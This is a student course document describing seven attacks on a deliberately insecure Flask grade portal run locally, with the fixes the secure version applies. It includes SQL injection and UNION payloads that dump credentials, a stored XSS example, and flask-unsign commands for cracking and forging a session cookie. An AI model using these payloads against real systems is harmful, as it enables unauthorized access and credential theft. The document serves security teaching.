# Attack Reference: Insecure Grade Portal

SOFE4840U · Group 6 · Ontario Tech University · Winter 2026

---

## Setup

```bash
cd insecure_app
python db_setup.py
python app.py        # runs on http://localhost:5000
```

Demo accounts: `alice / password1` · `bob / qwerty` · `carol / letmein` · `admin / admin123`

---

## Attacks

### 1. Login bypass (SQL Injection)
**Where:** Login form, username field  
**Payload:**
```
Username:  ' OR '1'='1'--
Password:  anything
```
Logs in as admin with no valid credentials. The `--` comments out the password check entirely.

---

### 2. Dump all students' grades (SQL Injection)
**Where:** Course search bar (logged in as any student)  
**Payload:**
```
' OR '1'='1'--
```
Returns every grade record in the database across all students, not just your own.

---

### 3. Steal usernames and passwords (SQL Injection + UNION)
**Where:** Course search bar (logged in as any student)  
**Payload:**
```
' UNION SELECT id,username,password,student_id,password FROM users--
```
The users table appears as course cards. usernames and plaintext passwords visible in the browser.

---

### 4. Stored XSS
**Where:** Professor notes rendered on the dashboard  
**How:** Log in as any account whose notes contain a `<script>` tag (alice by default)  
The script executes automatically on page load. In a real attack this would silently steal session data or redirect the user.

---

### 5. Read plaintext passwords from the database
**Where:** `grades.db` file  
**How:**
```bash
sqlite3 insecure_app/grades.db "SELECT username, password FROM users;"
```
All passwords stored as plain readable text. Also exposed via Attack 3.

---

### 6. Access admin panel without logging in
**Where:** `/admin` route- no session check  
**How:** Navigate directly to `http://localhost:5000/admin` without logging in.  
Full user list with passwords and all grade records are visible to anyone.

---

### 7. Weak session secret (cookie forgery)
**Where:** `app.py` — `app.secret_key = "secret"`  
**How:** Use `flask-unsign` to crack the key from a captured cookie, then forge a new cookie with `role: admin`.
```bash
pip install flask-unsign
flask-unsign --unsign --cookie '<your cookie>' --wordlist rockyou.txt
flask-unsign --sign --cookie '{"role": "admin"}' --secret 'secret'
```

---

## What each attack violates

| Attack | CIA Principle | OWASP 2021 |
|--------|--------------|------------|
| 1. Login bypass | Confidentiality, Authentication | A03 Injection |
| 2. Dump grades | Confidentiality | A03 Injection |
| 3. Steal credentials | Confidentiality | A03 Injection |
| 4. Stored XSS | Integrity, Session | A03 Injection |
| 5. Plaintext passwords | Confidentiality | A07 Auth Failures |
| 6. No access control | Confidentiality | A01 Broken Access |
| 7. Weak secret key | Authentication, Integrity | A02 Crypto Failures |

---

## How the secure version fixes each one

| Vulnerability | Fix |
|---------------|-----|
| SQL Injection | Parameterized queries. `cursor.execute("... WHERE id=?", (value,))` |
| Stored XSS | Remove `\| safe` — Jinja2 escapes `<script>` to `&lt;script&gt;` by default |
| Plaintext passwords | `bcrypt.hashpw()` on store, `bcrypt.checkpw()` on login |
| No access control | `if session.get('role') != 'admin': abort(403)` at top of route |
| Weak secret key | `app.secret_key = os.urandom(24)` or load from environment variable |
